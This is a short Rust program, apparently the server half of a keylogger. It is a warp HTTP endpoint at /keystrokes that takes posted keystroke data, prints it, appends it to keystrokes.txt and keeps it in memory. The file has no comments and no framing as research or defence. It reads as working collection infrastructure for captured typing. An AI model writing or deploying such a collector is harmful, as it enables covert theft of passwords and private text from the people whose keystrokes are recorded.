use warp::Filter;
use std::sync::{Arc, Mutex};
use std::fs::OpenOptions;
use std::io::Write;

#[tokio::main]
async fn main() {
    let keystrokes_store = Arc::new(Mutex::new(String::new()));

    let keystrokes = warp::path("keystrokes")
        .and(warp::post())
        .and(warp::body::bytes())
        .and_then({
            let keystrokes_store = keystrokes_store.clone();
            move |body: bytes::Bytes| {
                let keystrokes_store = keystrokes_store.clone();
                async move {
                    let keystrokes = String::from_utf8_lossy(&body);
                    println!("Received keystrokes: {}", keystrokes);
                    let mut file = OpenOptions::new()
                        .append(true)
                        .create(true)
                        .open("keystrokes.txt")
                        .expect("Unable to open file");
                    writeln!(file, "{}", keystrokes).expect("Unable to write to file");

                    let mut store = keystrokes_store.lock().unwrap();
                    store.push_str(&keystrokes);

                    Ok::<_, warp::Rejection>(warp::reply::with_status("Keystrokes received", warp::http::StatusCode::OK))
                }
            }
        });

    warp::serve(keystrokes).run(([127, 0, 0, 1], 3030)).await;
}
